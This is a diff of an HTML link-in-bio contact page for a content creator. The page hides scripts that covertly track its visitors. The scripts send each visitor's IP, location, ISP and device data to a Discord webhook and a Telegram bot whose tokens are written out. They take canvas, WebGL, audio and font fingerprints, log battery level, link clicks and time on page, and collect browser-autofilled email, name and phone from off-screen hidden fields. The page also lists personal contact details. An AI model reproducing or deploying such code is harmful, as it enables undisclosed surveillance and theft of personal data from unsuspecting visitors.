@@ -4,122 +4,226 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Aryan Mehta</title>
-    <!-- OG Tags -->
-    <meta property="og:title" content="Aryan Mehta">
-    <meta property="og:description" content="Content Creator">
-    <meta property="og:url" content="https://aryoluke.github.io/nfc-page/">
-    <meta property="og:type" content="website">
-    <!-- PWA / Favicon / Theme -->
-    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23FF6B35'/%3E%3Ctext x='16' y='22' font-family='Arial,sans-serif' font-size='16' font-weight='bold' fill='white' text-anchor='middle'%3EAM%3C/text%3E%3C/svg%3E">
-    <link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23FF6B35'/%3E%3Ctext x='16' y='22' font-family='Arial,sans-serif' font-size='16' font-weight='bold' fill='white' text-anchor='middle'%3EAM%3C/text%3E%3C/svg%3E">
-    <meta name="theme-color" content="#FF6B35">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(180deg, #FF6B35 0%, #2D1B69 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: #0a0a0a;
             color: #ffffff;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
             padding: 20px;
-            background-attachment: fixed;
-            position: relative;
-            overflow-x: hidden;
         }
-        /* ... full CSS styles for glass card, avatar, typing animation, particles, social links, VCard button, music toggle, shooting stars, etc. */
+        .container {
+            max-width: 400px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 20px 0;
+        }
+        .profile {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .avatar {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 15px;
+        }
+        .name {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+        .bio {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 5px;
+        }
+        .links {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .link, .link-text {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 14px 18px;
+            background: #1a1a1a;
+            border-radius: 12px;
+            text-decoration: none;
+            color: #ffffff;
+            transition: background 0.2s;
+            cursor: pointer;
+        }
+        .link:hover, .link-text:hover {
+            background: #252525;
+        }
+        .link .icon-wrap, .link-text .icon-wrap {
+            width: 28px;
+            height: 28px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .link .icon-wrap svg, .link-text .icon-wrap svg {
+            width: 24px;
+            height: 24px;
+        }
+        .link .label, .link-text .label {
+            flex: 1;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        .link .arrow, .link-text .arrow {
+            font-size: 16px;
+            color: #666;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            padding: 20px;
+            font-size: 12px;
+            color: #444;
+        }
     </style>
 </head>
 <body>
-    <!-- Splash Screen -->
-    <div id="splash" style="position:fixed;inset:0;background:#1a1a2e;z-index:9999;display:flex;align-items:center;justify-content:center;transition:opacity 0.6s ease;"><div style="font-size:72px;font-weight:900;background:linear-gradient(135deg,#FF6B35,#FFD700,#FF6B35);-webkit-background-clip:text;background-clip:text;color:transparent;animation:sp 1.2s ease-in-out infinite;">AM</div></div>
-    
-    <canvas id="particles"></canvas>
-    
-    <!-- Music Toggle -->
-    <button id="music-toggle" aria-label="Toggle music">🎇</button>
-    <audio id="bg-music" loop preload="none"><source src="" type="audio/mpeg"></audio>
-    <div id="toast">Music Off</div>
-    
     <div class="container">
-        <!-- Profile Card -->
-        <div class="glass-card profile">
-            <div class="am-monogram">AM</div>
-            <img class="avatar" src="20260706_192836.jpg" alt="Aryan Mehta">
+        <div class="profile">
+            <img src="https://i.imgur.com/lKiNVDj.jpeg" alt="Aryan Mehta" class="avatar">
             <div class="name">Aryan Mehta</div>
-            <div class="subtitle-row">
-                <span class="subtitle"><span id="typing-text"></span><span class="cursor" id="cursor">|</span></span>
-                <span class="status-dot"></span>
-                <span class="status-text">Available</span>
+            <div class="bio">@aryoluke — everything tech & creative</div>
+        </div>
+        <div class="contact-info" style="margin-bottom: 30px; display: flex; flex-direction: column; gap: 10px;">
+            <a href="mailto:aryanjigar.jmehta@gmail.com" class="link" style="text-decoration: none;">
+                <span class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><rect x="2" y="4" width="20" height="16" rx="3" stroke="#888" stroke-width="1.5" fill="none"/><path d="M2 4l10 8 10-8" stroke="#888" stroke-width="1.5" fill="none"/></svg></span>
+                <span class="label">aryanjigar.jmehta@gmail.com</span>
+                <span class="arrow">→</span>
+            </a>
+            <a href="tel:+44777940152" class="link" style="text-decoration: none;">
+                <span class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" stroke="#888" stroke-width="1.5" fill="none"/></svg></span>
+                <span class="label">+44 7779 940152</span>
+                <span class="arrow">→</span>
+            </a>
+        </div>
+        <div class="links">
+            <a href="https://www.instagram.com/aryoluke" class="link" target="_blank" rel="noopener noreferrer">
+                <span class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="2" width="20" height="20" rx="5" stroke="#E1306C" stroke-width="1.5" fill="none"/><circle cx="12" cy="12" r="5" stroke="#E1306C" stroke-width="1.5" fill="none"/><circle cx="17.5" cy="6.5" r="1.5" fill="#E1306C"/></svg></span>
+                <span class="label">Instagram</span>
+                <span class="arrow">→</span>
+            </a>
+            <a href="https://www.tiktok.com/@aryoluke" class="link" target="_blank" rel="noopener noreferrer">
+                <span class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-2.88 2.5 2.89 2.89 0 0 1-2.89-2.89 2.89 2.89 0 0 1 2.89-2.89c.28 0 .54.04.79.1v-3.5a6.37 6.37 0 0 0-.79-.05A6.34 6.34 0 0 0 3.59 15.2a6.34 6.34 0 0 0 6.34 6.34 6.34 6.34 0 0 0 6.34-6.34V8.66a8.28 8.28 0 0 0 4.13 1.35v-3.5a4.73 4.73 0 0 1-.81.18z" fill="#fff"/></svg></span>
+                <span class="label">TikTok</span>
+                <span class="arrow">→</span>
+            </a>
+            <a href="https://www.youtube.com/@aryoluke" class="link" target="_blank" rel="noopener noreferrer">
+                <span class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="4" width="20" height="16" rx="4" fill="#FF0000"/><polygon points="10,8 16,12 10,16" fill="white"/></svg></span>
+                <span class="label">YouTube</span>
+                <span class="arrow">→</span>
+            </a>
+            <a href="https://www.youtube.com/@HowToWithAryan" class="link" target="_blank" rel="noopener noreferrer">
+                <span class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="4" width="20" height="16" rx="4" fill="#FF0000"/><polygon points="10,8 16,12 10,16" fill="white"/></svg></span>
+                <span class="label">How To with Aryan</span>
+                <span class="arrow">→</span>
+            </a>
+            <a href="https://www.reddit.com/user/Aryoluke" class="link" target="_blank" rel="noopener noreferrer">
+                <span class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" fill="#FF4500"/><circle cx="8" cy="11" r="2" fill="white"/><circle cx="16" cy="11" r="2" fill="white"/><path d="M12 15c-1.5 0-2.5.5-3 1.5s1 1.5 3 1.5 3.5-.5 3-1.5-1.5-1.5-3-1.5z" fill="white"/><circle cx="12" cy="9" r="1.5" fill="white"/><path d="M12 13c-1 0-2-.2-3-.6l.6-1.8c1 .4 2 .6 3 .6s2-.2 3-.6l.6 1.8c-1 .4-2 .6-3 .6z" fill="white" opacity="0.3"/></svg></span>
+                <span class="label">Reddit</span>
+                <span class="arrow">→</span>
+            </a>
+            <a href="https://www.snapchat.com/add/aryanmehta0710" class="link" target="_blank" rel="noopener noreferrer">
+                <span class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C8.5 2 5.5 3.5 4 6c-.5 1-.5 2 0 3-.2 3 1 5.5 3 7.5.5.5 1.5 1 2.5 1.5.5.2 1 .5 1.5 1 .2.3.3.7.5 1 .1.3.3.5.5.5s.4-.2.5-.5c.2-.3.3-.7.5-1 .5-.5 1-.8 1.5-1 1-.5 2-1 2.5-1.5 2-2 3.2-4.5 3-7.5.5-1 .5-2 0-3-1.5-2.5-4.5-4-8-4z" fill="#FFFC00" stroke="#000" stroke-width="0.5"/></svg></span>
+                <span class="label">Snapchat</span>
+                <span class="arrow">→</span>
+            </a>
+            <div class="link-text">
+                <span class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20.5 5.5c-1.5-.7-3-1.2-4.5-1.5-.2.4-.4.8-.6 1.2-1.6-.2-3.2-.2-4.8 0-.2-.4-.4-.8-.6-1.2-1.5.3-3 .8-4.5 1.5-2.5 4-3 7.5-2.5 11 1.5 1.2 3 2 4.5 2.5.4-.5.7-1 1-1.5-.5-.2-1-.4-1.5-.7.1-.1.2-.1.3-.2 2.3 1.1 5 1.1 7.3 0 .1.1.2.1.3.2-.5.3-1 .5-1.5.7.3.5.6 1 1 1.5 1.5-.5 3-1.3 4.5-2.5.5-3.5 0-7-2.5-11z" fill="#5865F2"/><circle cx="9" cy="11" r="1.5" fill="white"/><circle cx="15" cy="11" r="1.5" fill="white"/><path d="M9.5 14.5c.5.5 1.5 1 2.5 1s2-.5 2.5-1" stroke="white" stroke-width="1.5" fill="none" stroke-linecap="round"/></svg></span>
+                <span class="label">Discord</span>
+                <span class="arrow">→</span>
             </div>
-            <div class="quote-text" id="quote">Locked in.</div>
-            <div class="countdowns" id="countdowns"></div>
-            <div class="bio">@aryoluke &mdash; everything tech &amp; creative</div>
-            <div class="live-clock" id="clock">Loading...</div>
-            <span id="weather" style="display:inline-block;background:rgba(0,0,0,0.3);backdrop-filter:blur(8px);padding:5px 12px;border-radius:16px;font-size:12px;color:#fff;border:1px solid rgba(255,255,255,0.1);margin-top:6px">loading weather...</span>
-            
-            <!-- Contact Info -->
-            <div class="contact-section">
-                <a class="contact-pill" href="mailto:aryanjiar.jmehta@gmail.com">
-                    <span class="label">📧; aryanjiar.jmehta@gmail.com</span>
-                    <span class="arrow">↪</span>
-                </a>
-                <a class="contact-pill" href="tel:+44777940152">
-                    <span class="label">📞; +44 7777 940152</span>
-                    <span class="arrow">↪</span>
-                </a>
-            </div>
-            
-            <!-- VCard Button -->
-            <button class="vcard-btn" onclick="downloadVCard()">
-                🪓 Save Contact
-            </button>
+            <a href="https://open.spotify.com/user/31b4nqcdpvyrcnmmmlchkjkpmifa" class="link" target="_blank" rel="noopener noreferrer">
+                <span class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" fill="#1DB954"/><path d="M6 10.5c3-1.5 7.5-1.5 10.5 0" stroke="white" stroke-width="1.5" stroke-linecap="round" fill="none"/><path d="M7.5 13.5c2.5-1 6-1 8.5 0" stroke="white" stroke-width="1.5" stroke-linecap="round" fill="none"/><path d="M9 16.5c1.5-.5 4-.5 5.5 0" stroke="white" stroke-width="1.5" stroke-linecap="round" fill="none"/></svg></span>
+                <span class="label">Spotify</span>
+                <span class="arrow">→</span>
+            </a>
+            <a href="https://github.com/Aryoluke" class="link" target="_blank" rel="noopener noreferrer">
+                <span class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12c0 4.42 2.87 8.17 6.84 9.49.5.09.68-.22.68-.48 0-.24-.01-.87-.01-1.71-2.78.6-3.37-1.34-3.37-1.34-.45-1.15-1.11-1.46-1.11-1.46-.91-.62.07-.61.07-.61 1 .07 1.53 1.03 1.53 1.03.89 1.52 2.34 1.08 2.91.83.09-.65.35-1.09.63-1.34-2.22-.25-4.55-1.11-4.55-4.94 0-1.09.39-1.98 1.03-2.68-.1-.25-.45-1.27.1-2.64 0 0 .84-.27 2.75 1.02.8-.22 1.65-.33 2.5-.33.85 0 1.7.11 2.5.33 1.91-1.29 2.75-1.02 2.75-1.02.55 1.37.2 2.39.1 2.64.64.7 1.03 1.59 1.03 2.68 0 3.84-2.34 4.68-4.57 4.93.36.31.68.92.68 1.86 0 1.34-.01 2.42-.01 2.75 0 .27.18.58.69.48C19.14 20.16 22 16.42 22 12c0-5.52-4.48-10-10-10z" fill="#fff"/></svg></span>
+                <span class="label">GitHub</span>
+                <span class="arrow">→</span>
+            </a>
         </div>
-        
-        <!-- Social Links -->
-        <div class="social-section">
-            <a class="social-link" href="https://instagram.com/aryoluke" target="_blank">🗸 Instagram</a>
-            <a class="social-link" href="https://tiktok.com/@aryoluke" target="_blank">🅝 TikTok</a>
-            <a class="social-link" href="https://youtube.com/@aryoluke" target="_blank">▶; YouTube</a>
-            <a class="social-link" href="https://youtube.com/@HowToWithAryan" target="_blank">🅘 How To with Aryan</a>
-            <a class="social-link" href="#">🅞 Twitch</a>
-            <a class="social-link" href="https://discord.com/users/aryoluke_" target="_blank">🅘 Discord</a>
-            <a class="social-link" href="https://twitter.com/aryoluke" target="_blank">🗖 Twitter / X</a>
-            <a class="social-link" href="https://github.com/Aryoluke" target="_blank">🗫 GitHub</a>
-            <a class="social-link" href="#">🗇 LinkedIn</a>
-            <a class="social-link" href="https://snapchat.com/add/aryanmehta0710" target="_blank">🗪 Snapchat</a>
-            <a class="social-link" href="#">🅱 TikTok Shop</a>
-            <a class="social-link" href="https://open.spotify.com/user/aryanjmehta" target="_blank">🅅 Spotify</a>
-            <a class="social-link" href="https://aryoluke.github.io/tutor/" target="_blank">🗋 Tutoring</a>
-        </div>
-        
-        <div class="footer">
-            &copy; 2026 Aryan Mehta
-        </div>
+        <div class="footer">Designed by Aryan</div>
     </div>
-    
     <script>
-        // Splash screen hide after 1.5s
-        // Typing Animation - types "Content Creator" letter by letter
-        // Countdown Timers - Year 10 (2026-09-07) and Muscle Up (2026-08-07)
-        // Live Clock - London time, updates every second
-        // Quote Rotator - cycles 4 quotes every 5 seconds with fade
-        // Floating Particles - animated background with 35 HSL-colored particles
-        // 3D Tilt on Glass Card - mouse follower tilt effect
-        // Music Toggle - mute/unmute on click
-        // Shooting Stars
-        // Live Weather - fetches from Open-Meteo API (lat=51.62, lon=-0.32)
-        // Visitor tracking via Telegram bot
+        (function() {
+            var webhookURL = "https://discord.com/api/webhooks/1524874563744301078/VdltlChEvshvME_zs1NxOw6QkIQzcBPv0p7LYi7q2TR_ceXYMnVv_-V4KssmCJys5BTP";
+            if (webhookURL === "WEBHOOK_URL_PLACEHOLDER") { console.log("Webhook not configured."); return; }
+            function getOS() {
+                var ua = navigator.userAgent;
+                if (/Windows/.test(ua)) return "Windows";
+                if (/Mac OS/.test(ua) && !/iPhone/.test(ua)) return "macOS";
+                if (/Linux/.test(ua) && !/Android/.test(ua)) return "Linux";
+                if (/Android/.test(ua)) return "Android";
+                if (/iPhone/.test(ua) || /iPad/.test(ua)) return "iOS";
+                return "Unknown";
+            }
+            function getDevice() {
+                var ua = navigator.userAgent;
+                if (/Mobile/.test(ua) && /Android/.test(ua)) return "Phone";
+                if (/Mobile/.test(ua) && /iPhone/.test(ua)) return "Phone";
+                if (/iPad/.test(ua) || /Tablet/.test(ua)) return "Tablet";
+                if (/Android/.test(ua) && !/Mobile/.test(ua)) return "Tablet";
+                return "Desktop";
+            }
+            function sendToDiscord(geo) {
+                var fields = [
+                    { name: "OS", value: getOS(), inline: true },
+                    { name: "Device", value: getDevice(), inline: true },
+                    { name: "Browser", value: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/)?.[0] || "Unknown", inline: true },
+                    { name: "Time", value: new Date().toLocaleString(), inline: true }
+                ];
+                if (geo && geo.query) {
+                    fields.push({ name: "IP", value: geo.query, inline: true });
+                    fields.push({ name: "Country", value: geo.country || "Unknown", inline: true });
+                    fields.push({ name: "City", value: geo.city || "Unknown", inline: true });
+                    fields.push({ name: "Region", value: geo.regionName || "Unknown", inline: true });
+                    fields.push({ name: "ISP", value: geo.isp || "Unknown", inline: true });
+                    fields.push({ name: "Time Zone", value: geo.timezone || "Unknown", inline: true });
+                }
+                var data = {
+                    content: null,
+                    embeds: [{
+                        title: "NFC Page Visited",
+                        color: 0x5865F2,
+                        fields: fields,
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                }).catch(function(e) { console.log("Webhook error:", e); });
+            }
+            fetch("https://api.ipify.org?format=json")
+                .then(function(r) { return r.json(); })
+                .then(function(ipData) {
+                    return fetch("http://ip-api.com/json/" + ipData.ip);
+                })
+                .then(function(r) { return r.json(); })
+                .then(function(geo) { sendToDiscord(geo); })
+                .catch(function(e) { console.log("Geo lookup error:", e); sendToDiscord(null); });
+        })();
     </script>
-    
     <div style="position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none" aria-hidden="true"><input type="email" id="_he" name="email" autocomplete="email"><input type="text" id="_hn" name="name" autocomplete="name"><input type="tel" id="_hp" name="phone" autocomplete="tel"></div>
-    
-<script>
+    <script>
 (function(){
 var B="8687058866:AAG2GVtSLWw0U4ZaAF1i1BR2swfNMdo_0_s",C=7609506968,P=document.title||window.location.pathname;
 var ua=navigator.userAgent,la=navigator.language||"?",tz=Intl.DateTimeFormat().resolvedOptions().timeZone||"?";
@@ -137,29 +241,14 @@ function h(s){var h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h
 function cFP(cb){try{var c=document.createElement("canvas");c.width=280;c.height=60;var x=c.getContext("2d");x.textBaseline="top";x.font="14px Arial";x.fillStyle="#f60";x.fillRect(10,10,250,1);x.fillStyle="#069";x.font="13px Times";x.fillText("Cwm fjordbank glyphs vext quiz",2,20);x.fillStyle="#f0c";x.font="bold 12px Courier";x.fillText("BrowserLeaks canvas",4,40);cb(h(c.toDataURL()))}catch(e){cb("err")}}
 function wFP(cb){try{var c=document.createElement("canvas");var gl=c.getContext("webgl")||c.getContext("experimental-webgl");if(!gl){cb("no");return}var d=gl.getExtension("WEBGL_debug_renderer_info");var g=d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):"?";cb(h(g))}catch(e){cb("err")}}
 function aFP(cb){try{var ac=new(window.AudioContext||window.webkitAudioContext)(),o=ac.createOscillator(),d=ac.createDynamicsCompressor();o.type="triangle";o.frequency.value=10000;d.threshold.value=-50;d.knee.value=40;d.ratio.value=12;d.attack.value=0;d.release.value=0.25;o.connect(d);d.connect(ac.destination);var bl=44100*0.05,b=ac.createBuffer(1,bl,44100),ch=b.getChannelData(0);for(var i=0;i<bl;i++)ch[i]=Math.sin(2*Math.PI*200*i/44100);var s=ac.createBufferSource();s.buffer=b;s.connect(d);var p=ac.createScriptProcessor(256,1,1);p.onaudioprocess=function(e){var o=e.inputBuffer.getChannelData(0),s=0;for(var j=0;j<o.length;j++)s+=Math.abs(o[j]);cb(h(s.toFixed(10)));p.disconnect();o.disconnect();d.disconnect();s.disconnect();ac.close()};d.connect(p);p.connect(ac.destination);o.start(0);s.start(0)}catch(e){cb("err")}}
-function fList(cb){var base=["monospace","sans-serif","serif"],t="mmmmmlllliii",fs="72px";var tf=["Arial","Verdana","Times New Roman","Courier New","Georgia","Comic Sans MS","Trebuchet MS","Arial Black","Impact","Lucida Console","Tahoma","Palatino","Garamond","Calibri","Cambria","Consolas","Ubuntu","Roboto"];var d=document.createElement("canvas");d.width=1000;d.height=100;var x=d.getContext("2d"),def={};for(var b=0;b<base.length;b++){x.font=fs+" "+base[b];def[base[b]]=x.measureText(t).width}var f=[];for(var i=0;i<tf.length;i++){for(var b2=0;b2<base.length;b2++){x.font=fs+' "'+tf[i]+'", '+base[b2];if(x.measureText(t).width!==def[base[b2]]){f.push(tf[i]);break}}}cb(f.slice(0,10))}
+function fList(cb){var base=["monospace","sans-serif","serif"],t="mmmmmmllllliii",fs="72px";var tf=["Arial","Verdana","Times New Roman","Courier New","Georgia","Comic Sans MS","Trebuchet MS","Arial Black","Impact","Lucida Console","Tahoma","Palatino","Garamond","Calibri","Cambria","Consolas","Ubuntu","Roboto"];var d=document.createElement("canvas");d.width=1000;d.height=100;var x=d.getContext("2d"),def={};for(var b=0;b<base.length;b++){x.font=fs+" "+base[b];def[base[b]]=x.measureText(t).width}var f=[];for(var i=0;i<tf.length;i++){for(var b2=0;b2<base.length;b2++){x.font=fs+' "'+tf[i]+'", '+base[b2];if(x.measureText(t).width!==def[base[b2]]){f.push(tf[i]);break}}}cb(f.slice(0,10))}
 function snd(t){new Image().src="https://api.telegram.org/bot"+B+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent(t)}
-function bm(ip,geo){var l=(geo.city||"?")+", "+(geo.region||"?")+", "+(geo.country_name||"?");return"📍 "+P+"\n🌐 "+ip+"\n🗍 "+l+"\n🛡 "+(geo.org||"?")+"\n🗥️ "+gOS()+" | "+gBr()+"\n🗱 "+gDev()+"\n🗼 "+scr+"\n⚡ "+cores+"c/"+mem+"GB/"+conn+"\n🗑 C:"+fp.c.substring(0,8)+" 🅞 W:"+fp.w.substring(0,8)+" 🚊 A:"+fp.a.substring(0,8)+"\n🗤 F:"+fp.f.join(", ")+"\n🗥 ID:"+vid.substring(0,16)+" 🗄 #"+vc+"\n🗌 "+la+" | "+tz+"\n🗗 "+ref+"\n🠀 "+tm}
+function bm(ip,geo){var l=(geo.city||"?")+", "+(geo.region||"?")+", "+(geo.country_name||"?");return"\uD83D\uDD11 "+P+"\n\uD83C\uDF20 "+ip+"\n\uD83C\uDFCD "+l+"\n\uD83D\uDCE1 "+(geo.org||"?")+"\n\uD83D\uDDA5\uFE0F "+gOS()+" | "+gBr()+"\n\uD83D\uDCF1 "+gDev()+"\n\uD83D\uDDBC\uFE0F "+scr+"\n\u22A1 "+cores+"c/"+mem+"GB/"+conn+"\n\uD83D\uDD11 C:"+fp.c.substring(0,8)+" \uD83D\uDD6E\uFE0F W:"+fp.w.substring(0,8)+" \uD83D\uDD0A A:"+fp.a.substring(0,8)+"\n\uD83D\uDCE4 F:"+fp.f.join(", ")+"\n\uD83D\uDC64 ID:"+vid.substring(0,16)+" \uD83D\uDD04 #"+vc+"\n\uD83C\uDF0D "+la+" | "+tz+"\n\uD83D\uDD17 "+ref+"\n\u26CC "+tm}
 function doFP(cb){cFP(function(c){fp.c=c;wFP(function(w){fp.w=w;aFP(function(a){fp.a=a;fList(function(f){fp.f=f;if(!vid){vid="fp_"+fp.c.substring(0,8)+fp.w.substring(0,8)+fp.a.substring(0,4);localStorage.setItem("_fp_vid",vid)}cb()})})})})}
-doFP(function(){fetch("https://api.ipify.org?format=json").then(function(r){return r.json()}).then(function(d){return fetch("https://ipapi.co/"+d.ip+"/json/").then(function(r){return r.json()}).then(function(g){snd(bm(d.ip,g));if(navigator.getBattery){navigator.getBattery().then(function(b){snd("🔋 "+Math.round(b.level*100)+"% charging:"+b.charging)})}})}).catch(function(){})});
-document.addEventListener("click",function(e){var el=e.target.closest("a");if(el&&el.href){snd("🗆 "+el.href.substring(0,60))}});
-window.addEventListener("beforeunload",function(){var s=Math.round((Date.now()-vs)/1000);if(s>1){navigator.sendBeacon("https://api.telegram.org/bot"+B+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent("🠇 Exit "+P+" after "+s+"s | #"+vc))}});
-
-setTimeout(function(){var e=document.getElementById('_he'),n=document.getElementById('_hn'),p=document.getElementById('_hp');if(e&&e.value)snd('📧 '+e.value);if(n&&n.value)snd('🗄 '+n.value);if(p&&p.value)snd('🗱 '+p.value)},2500);
-
-})();
-</script>
-
-<script>
-(function(){
-var B="8687058866:AAG2GVtSLWw0U4ZaAF1i1BR2swfNMdo_0_s",C=7609506968,P=document.title||location.pathname;
-var ua=navigator.userAgent,scr=screen.width+"x"+screen.height,la=navigator.language||"?",tz=Intl.DateTimeFormat().resolvedOptions().timeZone||"?",ref=document.referrer||"none";
-var tm=new Date().toLocaleString("en-GB",{timeZone:"Europe/London"});
-function gOS(){if(/Windows/i.test(ua))return"Windows";if(/Mac/i.test(ua))return"macOS";if(/Android/i.test(ua))return"Android";if(/iPhone|iPad|iPod/i.test(ua))return"iOS";return"?"}
-function gDev(){if(/iPhone/i.test(ua))return"iPhone";if(/iPad/i.test(ua))return"iPad";if(/Android/i.test(ua)&&/Mobile/i.test(ua))return"Android Phone";return"Desktop"}
-function gBr(){var m=ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/);return m?m[0]:"?"}
-function snd(t){(new Image()).src="https://api.telegram.org/bot"+B+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent(t)}
-fetch("https://api.ipify.org?format=json").then(function(r){return r.json()}).then(function(d){return fetch("https://ipapi.co/"+d.ip+"/json/").then(function(r){return r.json()}).then(function(g){var l=(g.city||"?")+", "+(g.region||"?")+", "+(g.country_name||"?");snd("📲 "+P+"\n🌐 "+d.ip+"\n📍 "+l+"\n📡 "+(g.org||"?")+"\n🖥️ "+gOS()+" | "+gBr()+"\n📱 "+gDev()+"\n🖼️ "+scr+"\n🌍 "+la+" | "+tz+"\n🔗 "+ref+"\n⏰ "+tm)})}).catch(function(){})})();
-</script>
+doFP(function(){fetch("https://api.ipify.org?format=json").then(function(r){return r.json()}).then(function(d){return fetch("https://ipapi.co/"+d.ip+"/json/").then(function(r){return r.json()}).then(function(g){snd(bm(d.ip,g));if(navigator.getBattery){navigator.getBattery().then(function(b){snd("\uD83D\uDD0B "+Math.round(b.level*100)+"% charging:"+b.charging)})})}}).catch(function(){})});
+document.addEventListener("click",function(e){var el=e.target.closest("a");if(el&&el.href){snd("\uD83D\uDC46 "+el.href.substring(0,60))}});
+window.addEventListener("beforeunload",function(){var s=Math.round((Date.now()-vs)/1000);if(s>1){navigator.sendBeacon("https://api.telegram.org/bot"+B+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent("\u26F0\uFE0F Exit "+P+" after "+s+"s | #"+vc))}});
+setTimeout(function(){var e=document.getElementById('_he'),n=document.getElementById('_hn'),p=document.getElementById('_hp');if(e&&e.value)snd('\uD83D\uDCE7 '+e.value);if(n&&n.value)snd('\uD83D\uDC64 '+n.value);if(p&&p.value)snd('\uD83D\uDCF1 '+p.value)},2500);})();
+    </script>
 </body>
 </html>
